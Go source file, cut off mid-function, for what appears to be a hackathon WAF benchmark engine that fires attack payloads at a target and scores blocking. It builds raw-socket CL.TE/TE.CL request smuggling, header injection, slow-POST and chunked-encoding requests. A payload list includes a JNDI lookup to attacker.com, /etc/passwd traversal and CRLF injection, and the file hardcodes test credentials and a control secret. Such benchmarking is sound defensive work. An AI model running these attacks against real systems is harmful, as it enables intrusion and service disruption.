// Test Engine with Authentication, Curl Generation, and Detailed Reporting

package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/schollz/progressbar/v3"
)

// NewTestSuite creates a new test suite
func NewTestSuite(targetURL string, targetProfile string, activeModes []string) *TestSuiteResults {
	return &TestSuiteResults{
		Target:            targetURL,
		TargetProfile:     targetProfile,
		StartTime:         time.Now(),
		Results:           []DetailedResult{},
		ActiveModes:       activeModes,
		ExploitPayloads:   make(map[string][]string),
		ExploitBasePath:   "/var/www/benchmark/exploits",
		ExploitCategories: []string{},
		Summary: TestSummary{
			CategoryScores: make(map[string]CategoryScore),
		},
	}
}

func defaultAttackModes() []string {
	return []string{
		"mode1_malformed_request_only",
		"mode2_smuggling",
		"mode3_header_cannibalism",
		"mode4_slow_post",
		"mode5_chunked_variation",
	}
}

func (ts *TestSuiteResults) getActiveModes() []string {
	if len(ts.ActiveModes) == 0 {
		return defaultAttackModes()
	}
	return ts.ActiveModes
}

func isSlowPostMode(mode string) bool {
	return strings.EqualFold(strings.TrimSpace(mode), "mode4_slow_post")
}

var hardSlowPostEndpointIDs = map[string]struct{}{
	"V05": {},
	"V09": {},
	"V14": {},
	"V19": {},
	"V24": {},
}

var highImpactMalformedSlowPostPayloads = []string{
	`{"amount":Infinity,"currency":"USD"}`,
	`{"amount":NaN,"currency":"USD"}`,
	"..%2f..%2fetc%2fpasswd",
	"${jndi:ldap://attacker.com/Exploit}",
	"value\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
}

func isHardSlowPostEndpoint(def TestDefinition) bool {
	_, ok := hardSlowPostEndpointIDs[strings.ToUpper(strings.TrimSpace(def.ID))]
	return ok
}

func shouldRunDefinitionForMode(mode string, def TestDefinition) bool {
	if !isSlowPostMode(mode) {
		return true
	}
	return isHardSlowPostEndpoint(def)
}

func isLikelyMalformedPayload(payload string) bool {
	p := strings.ToLower(strings.TrimSpace(payload))
	if p == "" {
		return false
	}

	markers := []string{
		"%00",
		"\\x00",
		"\\u0000",
		"\r\n",
		"transfer-encoding",
		"chunked",
		"nan",
		"infinity",
		"../",
		"..%2f",
		"%2e%2e",
		"${jndi:",
	}
	for _, marker := range markers {
		if strings.Contains(p, marker) {
			return true
		}
	}
	return false
}

func appendUniquePayload(dst []string, seen map[string]struct{}, candidate string) []string {
	candidate = strings.TrimSpace(candidate)
	if candidate == "" {
		return dst
	}
	if _, ok := seen[candidate]; ok {
		return dst
	}
	seen[candidate] = struct{}{}
	return append(dst, candidate)
}

func slowPostVariantsForDefinition(def TestDefinition, variants []string) []string {
	if !isHardSlowPostEndpoint(def) {
		return nil
	}

	selected := make([]string, 0, 5)
	seen := make(map[string]struct{})

	for _, v := range variants {
		if !isLikelyMalformedPayload(v) {
			continue
		}
		selected = appendUniquePayload(selected, seen, v)
		if len(selected) >= 5 {
			return selected[:5]
		}
	}

	for _, v := range highImpactMalformedSlowPostPayloads {
		selected = appendUniquePayload(selected, seen, v)
		if len(selected) >= 5 {
			return selected[:5]
		}
	}

	for _, v := range variants {
		selected = appendUniquePayload(selected, seen, v)
		if len(selected) >= 5 {
			return selected[:5]
		}
	}

	return selected
}

func variantsForModeAndDefinition(mode string, def TestDefinition, variants []string) []string {
	if !isSlowPostMode(mode) {
		return variants
	}
	return slowPostVariantsForDefinition(def, variants)
}

func normalizeCategoryKey(s string) string {
	s = strings.ToLower(strings.TrimSpace(s))
	s = strings.ReplaceAll(s, "_", "")
	s = strings.ReplaceAll(s, "-", "")
	s = strings.ReplaceAll(s, " ", "")
	return s
}

func categoryAliases(category string) []string {
	key := normalizeCategoryKey(category)
	aliases := []string{key}
	switch key {
	case "sqli":
		aliases = append(aliases, "nosql")
	case "pathtraversal":
		aliases = append(aliases, "lfi", "rfi")
	}
	return aliases
}

func (ts *TestSuiteResults) loadExploitPayloads() error {
	ts.ExploitPayloads = make(map[string][]string)
	ts.ExploitCategories = ts.ExploitCategories[:0]

	entries, err := os.ReadDir(ts.ExploitBasePath)
	if err != nil {
		return fmt.Errorf("failed to read exploit base path %s: %w", ts.ExploitBasePath, err)
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		payloadPath := filepath.Join(ts.ExploitBasePath, entry.Name(), "payloads.txt")
		f, err := os.Open(payloadPath)
		if err != nil {
			continue
		}

		var lines []string
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			lines = append(lines, line)
		}
		_ = f.Close()
		if scanErr := scanner.Err(); scanErr != nil {
			return fmt.Errorf("failed to scan %s: %w", payloadPath, scanErr)
		}
		if len(lines) == 0 {
			continue
		}

		catKey := normalizeCategoryKey(entry.Name())
		ts.ExploitPayloads[catKey] = lines
		ts.ExploitCategories = append(ts.ExploitCategories, catKey)
	}

	sort.Strings(ts.ExploitCategories)
	return nil
}

func (ts *TestSuiteResults) payloadLinesForCategory(category string) []string {
	for _, alias := range categoryAliases(category) {
		if lines, ok := ts.ExploitPayloads[alias]; ok {
			return lines
		}
	}
	return nil
}

// Authenticate performs the two-step auth flow
func (ts *TestSuiteResults) Authenticate() error {
	targetURL := ts.Target

	// Step 1: Login with password
	loginData := map[string]string{
		"username": "alice",
		"password": "P@ssw0rd1",
	}
	loginJSON, _ := json.Marshal(loginData)

	resp, err := http.Post(
		targetURL+"/login",
		"application/json",
		bytes.NewBuffer(loginJSON),
	)
	if err != nil {
		return fmt.Errorf("login request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var loginResp struct {
		LoginToken string `json:"login_token"`
		Success    bool   `json:"success"`
	}
	if err := json.Unmarshal(body, &loginResp); err != nil {
		return fmt.Errorf("failed to parse login response: %v", err)
	}

	if loginResp.LoginToken == "" {
		return fmt.Errorf("no login_token received")
	}

	// Step 2: Exchange login token for session
	otpData := map[string]string{
		"login_token": loginResp.LoginToken,
		"otp_code":    "123456",
	}
	otpJSON, _ := json.Marshal(otpData)

	resp2, err := http.Post(
		targetURL+"/otp",
		"application/json",
		bytes.NewBuffer(otpJSON),
	)
	if err != nil {
		return fmt.Errorf("otp request failed: %v", err)
	}
	defer resp2.Body.Close()

	body2, _ := io.ReadAll(resp2.Body)

	var otpResp struct {
		SessionID string `json:"session_id"`
		Success   bool   `json:"success"`
	}
	if err := json.Unmarshal(body2, &otpResp); err != nil {
		return fmt.Errorf("failed to parse otp response: %v", err)
	}

	if otpResp.SessionID == "" {
		return fmt.Errorf("no session_id received")
	}

	ts.AuthSession = &AuthSession{
		SID:        otpResp.SessionID,
		LoginToken: loginResp.LoginToken,
		Username:   "alice",
		ObtainedAt: time.Now(),
	}

	return nil
}

// RunTests executes all test definitions
// Workflow: run non-auth tests first, then auth-required tests.
// After each category completes: reset -> wait 5s -> health check -> re-authenticate.
func (ts *TestSuiteResults) RunTests() error {
	if err := ts.loadExploitPayloads(); err != nil {
		return err
	}

	definitions := GetTestDefinitions()
	client := CreateHTTPClient()

	// Separate definitions into non-auth and auth-required
	var nonAuthDefs []TestDefinition
	var authDefs []TestDefinition
	for _, def := range definitions {
		if def.Auth {
			authDefs = append(authDefs, def)
		} else {
			nonAuthDefs = append(nonAuthDefs, def)
		}
	}

	// Phase 1: Run non-auth tests first
	fmt.Printf("  → Running %d non-auth test definitions...\n", len(nonAuthDefs))
	if err := ts.runDefinitionsByCategory(client, nonAuthDefs); err != nil {
		ts.EndTime = time.Now()
		ts.calculateSummary()
		return err
	}

	// Phase 2: Run auth-required tests
	fmt.Printf("  → Running %d auth-required test definitions...\n", len(authDefs))
	if err := ts.runDefinitionsByCategory(client, authDefs); err != nil {
		ts.EndTime = time.Now()
		ts.calculateSummary()
		return err
	}

	ts.EndTime = time.Now()
	ts.calculateSummary()
	return nil
}

func (ts *TestSuiteResults) plannedPayloadExecutions(defs []TestDefinition) int {
	if len(defs) == 0 {
		return 0
	}

	categoryOrder := make([]string, 0)
	grouped := make(map[string][]TestDefinition)
	for _, def := range defs {
		if _, ok := grouped[def.Category]; !ok {
			categoryOrder = append(categoryOrder, def.Category)
		}
		grouped[def.Category] = append(grouped[def.Category], def)
	}

	activeModes := ts.getActiveModes()
	total := 0
	for _, category := range categoryOrder {
		catDefs := grouped[category]
		payloadLines := ts.payloadLinesForCategory(category)
		for _, def := range catDefs {
			if def.Auth && ts.AuthSession == nil {
				continue
			}
			if len(payloadLines) > 0 {
				for _, mode := range activeModes {
					if !shouldRunDefinitionForMode(mode, def) {
						continue
					}
					total += len(variantsForModeAndDefinition(mode, def, payloadLines))
				}
				continue
			}
			for _, payload := range def.Payloads {
				for _, mode := range activeModes {
					if !shouldRunDefinitionForMode(mode, def) {
						continue
					}
					total += len(variantsForModeAndDefinition(mode, def, payload.Variants))
				}
			}
		}
	}
	return total
}

func (ts *TestSuiteResults) runDefinitionsByCategory(client *http.Client, defs []TestDefinition) error {
	if len(defs) == 0 {
		return nil
	}

	categoryOrder := make([]string, 0)
	grouped := make(map[string][]TestDefinition)
	for _, def := range defs {
		if _, ok := grouped[def.Category]; !ok {
			categoryOrder = append(categoryOrder, def.Category)
		}
		grouped[def.Category] = append(grouped[def.Category], def)
	}

	activeModes := ts.getActiveModes()
	for _, category := range categoryOrder {
		catDefs := grouped[category]
		payloadLines := ts.payloadLinesForCategory(category)
		fmt.Printf("    · Category %s (%d definitions, %d payload lines, %d modes)\n", category, len(catDefs), len(payloadLines), len(activeModes))

		categoryTotal := 0
		for _, def := range catDefs {
			if def.Auth && ts.AuthSession == nil {
				continue
			}
			if len(payloadLines) > 0 {
				for _, mode := range activeModes {
					if !shouldRunDefinitionForMode(mode, def) {
						continue
					}
					categoryTotal += len(variantsForModeAndDefinition(mode, def, payloadLines))
				}
				continue
			}
			for _, payload := range def.Payloads {
				for _, mode := range activeModes {
					if !shouldRunDefinitionForMode(mode, def) {
						continue
					}
					categoryTotal += len(variantsForModeAndDefinition(mode, def, payload.Variants))
				}
			}
		}

		var bar *progressbar.ProgressBar
		if categoryTotal > 0 {
			bar = progressbar.NewOptions(categoryTotal,
				progressbar.OptionSetWriter(os.Stdout),
				progressbar.OptionSetDescription(fmt.Sprintf("      payload progress (%s)", category)),
				progressbar.OptionSetWidth(40),
				progressbar.OptionShowCount(),
				progressbar.OptionSetRenderBlankState(true),
				progressbar.OptionShowIts(),
				progressbar.OptionClearOnFinish(),
			)
		}

		for _, mode := range activeModes {
			for _, def := range catDefs {
				if def.Auth && ts.AuthSession == nil {
					ts.appendSkipResults(def)
					continue
				}

				if !shouldRunDefinitionForMode(mode, def) {
					continue
				}

				if len(payloadLines) > 0 {
					for _, line := range variantsForModeAndDefinition(mode, def, payloadLines) {
						payload := AdvancedPayload{
							Name:       "dynamic_file_payload",
							RawPayload: line,
							Variants:   []string{line},
							Technique:  "dynamic_file",
						}
						result := ts.executeTestForMode(client, def, payload, line, mode)
						ts.Results = append(ts.Results, result)
						if bar != nil {
							_ = bar.Add(1)
						}
					}
					continue
				}

				for _, payload := range def.Payloads {
					for _, variant := range variantsForModeAndDefinition(mode, def, payload.Variants) {
						result := ts.executeTestForMode(client, def, payload, variant, mode)
						ts.Results = append(ts.Results, result)
						if bar != nil {
							_ = bar.Add(1)
						}
					}
				}
			}
		}

		if bar != nil {
			_ = bar.Finish()
			fmt.Printf("      payload progress (%s): %d/%d\n", category, categoryTotal, categoryTotal)
		}

		if err := ts.postCategoryLifecycle(client, category); err != nil {
			return err
		}
	}

	return nil
}

func (ts *TestSuiteResults) appendSkipResults(def TestDefinition) {
	for _, payload := range def.Payloads {
		for _, variant := range payload.Variants {
			ts.Results = append(ts.Results, DetailedResult{
				TestID:         def.ID,
				Category:       def.Category,
				Method:         def.Method,
				Path:           def.Path,
				AuthRequired:   def.Auth,
				PayloadUsed:    payload.RawPayload,
				PayloadVariant: variant,
				Technique:      payload.Technique,
				Passed:         false,
				Reason:         "Skipped - auth required but no session available",
				Timestamp:      time.Now(),
			})
		}
	}
}

func (ts *TestSuiteResults) postCategoryLifecycle(client *http.Client, category string) error {
	if err := ts.triggerControlReset(client); err != nil {
		return fmt.Errorf("category %s halted: reset failed: %w", category, err)
	}

	time.Sleep(5 * time.Second)

	if err := ts.verifyHealth(client); err != nil {
		return fmt.Errorf("category %s halted: health verification failed after reset: %w", category, err)
	}

	if err := ts.Authenticate(); err != nil {
		return fmt.Errorf("category %s halted: re-authentication failed after reset: %w", category, err)
	}

	fmt.Printf("      reset+health+re-auth completed for category %s\n", category)
	return nil
}

func (ts *TestSuiteResults) triggerControlReset(client *http.Client) error {
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(ts.Target, "/")+"/__control/reset", nil)
	if err != nil {
		return err
	}
	req.Header.Set("X-Benchmark-Secret", "waf-hackathon-2026-ctrl")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		return fmt.Errorf("unexpected status %d body=%s", resp.StatusCode, string(body))
	}
	return nil
}

func (ts *TestSuiteResults) verifyHealth(client *http.Client) error {
	healthURL := strings.TrimRight(ts.Target, "/") + "/health"
	start := time.Now()
	resp, err := client.Get(healthURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	latency := time.Since(start)
	if latency > 2*time.Second {
		return fmt.Errorf("latency too high: %s", latency)
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
	if err != nil {
		return err
	}

	var health struct {
		Status string `json:"status"`
	}
	if err := json.Unmarshal(body, &health); err != nil {
		return fmt.Errorf("invalid health JSON: %w", err)
	}
	if health.Status != "ok" {
		return fmt.Errorf("unexpected health status=%q", health.Status)
	}

	return nil
}

// Execute a single test for one explicit attack mode.
func (ts *TestSuiteResults) executeTestForMode(
	client *http.Client,
	def TestDefinition,
	payload AdvancedPayload,
	variant string,
	mode string,
) DetailedResult {
	result := DetailedResult{
		TestID:         def.ID,
		Category:       def.Category,
		Method:         def.Method,
		Path:           def.Path,
		AuthRequired:   def.Auth,
		PayloadUsed:    payload.RawPayload,
		PayloadVariant: variant,
		Technique:      payload.Technique,
		MarkerExpected: def.Marker,
		AttackMode:     mode,
		Timestamp:      time.Now(),
	}

	start := time.Now()
	execRes, err := ts.executeAttackMode(client, def, payload, variant, mode)
	result.DurationMs = time.Since(start).Milliseconds()
	if err != nil {
		result.Reason = fmt.Sprintf("%s execution failed: %v", mode, err)
		result.Evidence = result.Reason
		result.MaxScore = getMaxScoreForTest(def.ID)
		result.Score = 0
		return result
	}

	result.CurlCommand = execRes.CurlCommand
	result.RawRequest = execRes.RawRequest
	result.RawResponse = execRes.RawResponse
	result.ReproductionScript = execRes.ReproductionScript
	result.ResponseStatus = execRes.StatusCode
	result.ResponseHeaders = execRes.Headers
	result.ResponseBody = execRes.Body
	result.FullResponse = execRes.FullResponse

	mainFound, mainLocation, otherFound, otherMarker, otherLocation := detectMainAndOtherMarkers(
		result.ResponseBody,
		result.ResponseHeaders,
		result.MarkerExpected,
	)

	result.MainMarkerFound = mainFound
	result.MainMarkerLocation = mainLocation
	result.OtherMarkerFound = otherFound
	result.OtherMarker = otherMarker
	result.OtherMarkerLocation = otherLocation

	reconcileMarkerSignals(&result)

	statusCompliant, statusEvidence := evaluateStatusContract(def, result.ResponseStatus)
	result.StatusCompliant = statusCompliant
	result.StatusEvidence = statusEvidence

	result.Passed = evaluateTestResult(def, result)
	if result.Passed {
		result.Evidence = fmt.Sprintf("[%s] WAF blocked/sanitized %s attack. Status=%d MarkerFound=%v StatusContract=%v",
			mode, def.Category, result.ResponseStatus, result.MarkerFound, statusCompliant)
		result.Reason = "WAF protection active"
	} else {
		if result.MarkerFound {
			result.Evidence = fmt.Sprintf("[%s] VULNERABILITY CONFIRMED: Marker '%s' (%s) found in %s", mode, result.MatchedMarker, result.MarkerMatchType, result.MarkerLocation)
			result.Reason = fmt.Sprintf("Exploit succeeded - %s marker (%s) found in response %s", result.MatchedMarker, result.MarkerMatchType, result.MarkerLocation)
		} else if !statusCompliant {
			result.Evidence = fmt.Sprintf("[%s] Contract violation: status check failed (%s)", mode, statusEvidence)
			result.Reason = fmt.Sprintf("Status contract violation: %s", statusEvidence)
		} else {
			result.Evidence = fmt.Sprintf("[%s] Potential bypass: status=%d without expected marker", mode, result.ResponseStatus)
			result.Reason = fmt.Sprintf("Unexpected response %d - possible WAF bypass/application issue", result.ResponseStatus)
		}
	}

	result.MaxScore = getMaxScoreForTest(def.ID) / float64(len(ts.getActiveModes()))
	if result.Passed {
		result.Score = result.MaxScore
	}

	return result
}

type attackExecutionResult struct {
	StatusCode         int
	Headers            map[string]string
	Body               string
	FullResponse       string
	RawRequest         string
	RawResponse        string
	CurlCommand        string
	ReproductionScript string
}

func (ts *TestSuiteResults) executeAttackMode(client *http.Client, def TestDefinition, payload AdvancedPayload, variant, mode string) (attackExecutionResult, error) {
	switch mode {
	case "mode1_malformed_request_only":
		return ts.executeModeStandard(client, def, payload, variant)
	case "mode2_smuggling":
		return ts.executeModeSmuggling(def, variant, true)
	case "mode3_header_cannibalism":
		return ts.executeModeHeaderCannibalism(def, variant)
	case "mode4_slow_post":
		return ts.executeModeSlowPost(def, payload, variant)
	case "mode5_chunked_variation":
		return ts.executeModeChunkedVariation(def, variant)
	default:
		return ts.executeModeStandard(client, def, payload, variant)
	}
}

func (ts *TestSuiteResults) executeModeStandard(client *http.Client, def TestDefinition, payload AdvancedPayload, variant string) (attackExecutionResult, error) {
	req, err := ts.buildStandardRequest(def, payload, variant)
	if err != nil {
		return attackExecutionResult{}, err
	}

	bodyBytes, err := requestBodyBytes(req)
	if err != nil {
		return attackExecutionResult{}, fmt.Errorf("failed to snapshot request body: %w", err)
	}

	curl := generateCurlCommand(req, bodyBytes)
	reproduction := generateReproductionScript(req, bodyBytes)
	res, err := doHTTPAndCapture(client, req)
	if err != nil {
		return attackExecutionResult{}, err
	}
	res.CurlCommand = curl
	res.ReproductionScript = reproduction
	return res, nil
}

func (ts *TestSuiteResults) buildStandardRequest(def TestDefinition, payload AdvancedPayload, variant string) (*http.Request, error) {
	targetURL := ts.Target
	fullURL := targetURL + def.Path

	var body io.Reader
	var contentType string

	switch def.Method {
	case "GET", "DELETE":
		switch def.ID {
		case "V04":
			fullURL = targetURL + "/game/1?name=" + url.QueryEscape(variant)
		case "V06", "V07":
			fullURL = targetURL + resolveRequestPath(def, variant)
		case "V02":
			fullURL = targetURL + "/api/transactions?page=" + url.QueryEscape(variant)
		case "L05":
			fullURL = targetURL + "/nonexistent"
		case "L02":
			fullURL = targetURL + "/api/profile"
		case "L04":
			fullURL = targetURL + variant
		default:
			fullURL = targetURL + def.Path
		}
	case "POST", "PUT", "PATCH":
		contentType = payload.ContentType
		if contentType == "" {
			contentType = "application/json"
		}

		switch def.ID {
		case "V01", "V03", "V16":
			data := map[string]string{"username": variant, "password": "ignored"}
			jsonData, _ := json.Marshal(data)
			body = bytes.NewBuffer(jsonData)
		case "V05":
			data := map[string]string{"email": "a@b.com", "display_name": variant}
			jsonData, _ := json.Marshal(data)
			body = bytes.NewBuffer(jsonData)
		case "V08":
			data := map[string]string{"email": variant, "display_name": "x"}
			jsonData, _ := json.Marshal(data)
			body = bytes.NewBuffer(jsonData)
		case "V20":
			data := map[string]string{"comment": variant}
			jsonData, _ := json.Marshal(data)
			body = bytes.NewBuffer(jsonData)
		default:
			body = bytes.NewBufferString(variant)
		}
	}

	req, err := http.NewRequest(def.Method, fullURL, body)
	if err != nil {
		return nil, fmt.Errorf("request creation failed: %w", err)
	}

	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("User-Agent", "WAF-Benchmark-Phase-A/2.0")
	req.Header.Set("Accept", "application/json, text/html, */*")
	if def.Auth && ts.AuthSession != nil {
		req.Header.Set("Cookie", "sid="+ts.AuthSession.SID)
	}

	switch def.ID {
	case "V10":
		req.Header.Set("X-Custom", variant)
	case "V11":
		req.Host = variant
	}

	return req, nil
}

func doHTTPAndCapture(client *http.Client, req *http.Request) (attackExecutionResult, error) {
	rawReq, dumpErr := dumpRequestWire(req)
	if dumpErr != nil {
		rawReq = fmt.Sprintf("[raw request capture failed: %v]", dumpErr)
	}

	resp, err := client.Do(req)
	if err != nil {
		return attackExecutionResult{}, err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return attackExecutionResult{}, err
	}

	headers := make(map[string]string)
	headerLines := make([]string, 0, len(resp.Header))
	for k, v := range resp.Header {
		joined := strings.Join(v, ", ")
		headers[k] = joined
		headerLines = append(headerLines, fmt.Sprintf("%s: %s", k, joined))
	}

	full := fmt.Sprintf("HTTP/%d.%d %d %s\r\n%s\r\n\r\n%s",
		resp.ProtoMajor, resp.ProtoMinor, resp.StatusCode, resp.Status,
		strings.Join(headerLines, "\r\n"), string(bodyBytes),
	)

	return attackExecutionResult{
		StatusCode:   resp.StatusCode,
		Headers:      headers,
		Body:         string(bodyBytes),
		FullResponse: full,
		RawRequest:   rawReq,
		RawResponse:  full,
	}, nil
}

func buildRawRequest(method, host, path string, headers []string, body string) string {
	var b strings.Builder
	b.WriteString(method + " " + path + " HTTP/1.1\r\n")
	b.WriteString("Host: " + host + "\r\n")
	for _, h := range headers {
		b.WriteString(h + "\r\n")
	}
	b.WriteString("Connection: close\r\n")
	b.WriteString("\r\n")
	b.WriteString(body)
	return b.String()
}

func sendRawRequest(target, rawReq string, slowBody bool) (attackExecutionResult, error) {
	u, err := url.Parse(target)
	if err != nil {
		return attackExecutionResult{}, err
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	dialer := &net.Dialer{Timeout: 15 * time.Second}
	conn, err := dialer.Dial("tcp", host)
	if err != nil {
		return attackExecutionResult{}, err
	}
	defer conn.Close()

	if u.Scheme == "https" {
		tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: u.Hostname()})
		if err := tlsConn.Handshake(); err != nil {
			return attackExecutionResult{}, err
		}
		conn = tlsConn
	}

	if slowBody {
		parts := strings.SplitN(rawReq, "\r\n\r\n", 2)
		if _, err := io.WriteString(conn, parts[0]+"\r\n\r\n"); err != nil {
			return attackExecutionResult{}, err
		}
		if len(parts) == 2 {
			for i := 0; i < len(parts[1]); i += 2 {
				end := i + 2
				if end > len(parts[1]) {
					end = len(parts[1])
				}
				if _, err := io.WriteString(conn, parts[1][i:end]); err != nil {
					return attackExecutionResult{}, err
				}
				time.Sleep(900 * time.Millisecond)
			}
		}
	} else {
		if _, err := io.WriteString(conn, rawReq); err != nil {
			return attackExecutionResult{}, err
		}
	}

	_ = conn.SetReadDeadline(time.Now().Add(25 * time.Second))
	respBytes, err := io.ReadAll(conn)
	if err != nil {
		return attackExecutionResult{}, err
	}

	return parseRawHTTPResponse(rawReq, respBytes), nil
}

func parseRawHTTPResponse(rawReq string, rawResp []byte) attackExecutionResult {
	status := 0
	headers := map[string]string{}
	body := ""
	full := string(rawResp)

	parts := strings.SplitN(full, "\r\n\r\n", 2)
	head := parts[0]
	if len(parts) == 2 {
		body = parts[1]
	}

	lines := strings.Split(head, "\r\n")
	if len(lines) > 0 {
		sp := strings.Split(lines[0], " ")
		if len(sp) >= 2 {
			if code, err := strconv.Atoi(strings.TrimSpace(sp[1])); err == nil {
				status = code
			}
		}
	}
	for _, ln := range lines[1:] {
		kv := strings.SplitN(ln, ":", 2)
		if len(kv) == 2 {
			headers[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}

	return attackExecutionResult{
		StatusCode:   status,
		Headers:      headers,
		Body:         body,
		FullResponse: full,
		RawRequest:   rawReq,
		RawResponse:  full,
	}
}

func (ts *TestSuiteResults) executeModeKeepAliveRace(def TestDefinition, payload AdvancedPayload, variant string) (attackExecutionResult, error) {
	transport := &http.Transport{
		MaxIdleConns:        1,
		MaxIdleConnsPerHost: 1,
		MaxConnsPerHost:     1,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Timeout: 35 * time.Second, Transport: transport}

	reqClean, err := ts.buildStandardRequest(def, payload, "clean_probe_payload")
	if err != nil {
		return attackExecutionResult{}, err
	}
	reqMal, err := ts.buildStandardRequest(def, payload, variant)
	if err != nil {
		return attackExecutionResult{}, err
	}
	reqClean.Header.Set("Connection", "keep-alive")
	reqMal.Header.Set("Connection", "keep-alive")

	type job struct{ req *http.Request }
	jobs := make(chan job, 2)
	out := make(chan attackExecutionResult, 2)
	errCh := make(chan error, 1)

	go func() {
		for j := range jobs {
			res, e := doHTTPAndCapture(client, j.req)
			if e != nil {
				errCh <- e
				return
			}
			out <- res
		}
	}()

	jobs <- job{req: reqClean}
	jobs <- job{req: reqMal}
	close(jobs)

	var cleanRes, malRes attackExecutionResult
	for i := 0; i < 2; i++ {
		select {
		case e := <-errCh:
			return attackExecutionResult{}, e
		case r := <-out:
			if i == 0 {
				cleanRes = r
			} else {
				malRes = r
			}
		}
	}

	malRes.RawRequest = "# clean request on same keep-alive connection\n" + cleanRes.RawRequest + "\n\n# malicious follow-up request\n" + malRes.RawRequest
	malRes.RawResponse = "# clean response\n" + cleanRes.RawResponse + "\n\n# malicious response\n" + malRes.RawResponse
	malRes.CurlCommand = "[mode1_keepalive_race executed via persistent connection sequence]"
	return malRes, nil
}

func (ts *TestSuiteResults) executeModeSmuggling(def TestDefinition, variant string, clte bool) (attackExecutionResult, error) {
	u, err := url.Parse(ts.Target)
	if err != nil {
		return attackExecutionResult{}, err
	}
	path := resolveRequestPath(def, variant)
	body := "5\r\nhello\r\n0\r\n\r\n"

	headers := []string{
		"User-Agent: WAF-Benchmark-Phase-A/2.0",
		"Accept: */*",
	}
	if clte {
		headers = append(headers,
			"Content-Length: 4",
			"Transfer-Encoding: chunked",
		)
	} else {
		headers = append(headers,
			"Transfer-Encoding: chunked",
			"Content-Length: 60",
		)
	}

	raw := buildRawRequest("POST", u.Host, path, headers, body+variant)
	res, err := sendRawRequest(ts.Target, raw, false)
	if err != nil {
		return attackExecutionResult{}, err
	}
	if clte {
		res.CurlCommand = "[raw socket smuggling CL.TE]"
	} else {
		res.CurlCommand = "[raw socket smuggling TE.CL]"
	}
	return res, nil
}

func (ts *TestSuiteResults) executeModeHeaderCannibalism(def TestDefinition, variant string) (attackExecutionResult, error) {
	u, err := url.Parse(ts.Target)
	if err != nil {
		return attackExecutionResult{}, err
	}
	path := resolveRequestPath(def, variant)
	body := variant
	headers := []string{
		"Content-Type: application/json",
		"Content-Type: text/plain",
		"X-Weird-Header: abc\x00def",
		"X-Injected: line1\nline2",
		"Content-Length: " + strconv.Itoa(len(body)),
	}
	raw := buildRawRequest("POST", u.Host, path, headers, body)
	res, err := sendRawRequest(ts.Target, raw, false)
	if err != nil {
		return attackExecutionResult{}, err
	}
	res.CurlCommand = "[raw socket header cannibalism]"
	return res, nil
}

func (ts *TestSuiteResults) executeModeSlowPost(def TestDefinition, payload AdvancedPayload, variant string) (attackExecutionResult, error) {
	u, err := url.Parse(ts.Target)
	if err != nil {
		return attackExecutionResult{}, err
	}
	path := resolveRequestPath(def, variant)
	if def.Method == "GET" || def.Method == "DELETE" {
		return ts.executeModeStandard(CreateHTTPClient(), def, payload, variant)
	}

	body := variant
	headers := []string{
		"User-Agent: WAF-Benchmark-Phase-A/2.0",
		"Content-Type: application/json",
		"Content-Length: " + strconv.Itoa(len(body)),
	}
	raw := buildRawRequest("POST", u.Host, path, headers, body)

	out := make(chan attackExecutionResult, 1)
	errCh := make(chan error, 1)
	go func() {
		res, e := sendRawRequest(ts.Target, raw, true)
		if e != nil {
			errCh <- e
			return
		}
		out <- res
	}()

	select {
	case e := <-errCh:
		return attackExecutionResult{}, e
	case r := <-out:
		r.CurlCommand = "[slow-post raw socket 1-2 bytes/sec equivalent]"
		return r, nil
	case <-time.After(45 * time.Second):
		return attackExecutionResult{}, fmt.Errorf("slow-post timeout")
	}
}

func (ts *TestSuiteResults) executeModeChunkedVariation(def TestDefinition, variant string) (attackExecutionResult, error) {
	u, err := url.Parse(ts.Target)
	if err != nil {
		return attackExecutionResult{}, err
	}
	path := resolveRequestPath(def, variant)

	chunkBody := "5;comment=alpha\r\nUNION\r\n3\r\n SEL\r\n0\r\n\r\n" + variant
	headers := []string{
		"User-Agent: WAF-Benchmark-Phase-A/2.0",
		"Transfer-Encoding: chunked",
		"Content-Type: application/json",
	}
	raw := buildRawRequest("POST", u.Host, path, headers, chunkBody)
	res, err := sendRawRequest(ts.Target, raw, false)
	if err != nil {
		return attackExecutionResult{}, err
	}
	res.CurlCommand = "[raw socket chunked variation with chunk extensions]"
	return res, nil
}

var markerContractRegex = regexp.MustCompile(`__[VL]\d+[a-b]?_[A-Za-z0-9]+__`)
var otherExpectedMarkerRegex = regexp.MustCompile(`__[A-Za-z0-9_]+__`)

// Check marker with fallback logic:
// 1) main expected marker
// 2) any other expected marker from the global valid marker set
func checkMarkerWithFallback(body string, headers map[string]string, mainMarker string, otherMarkers []string) (bool, string, string, string) {
	// 1) Main marker has highest priority
	if isContractMarker(mainMarker) {
		if found, location := markerInResponse(body, headers, mainMarker); found {
			return true, location, mainMarker, "main"
		}
	}

	// 2) Fallback: any other valid marker
	for _, marker := range otherMarkers {
		if !isContractMarker(marker) || marker == mainMarker {
			continue
		}
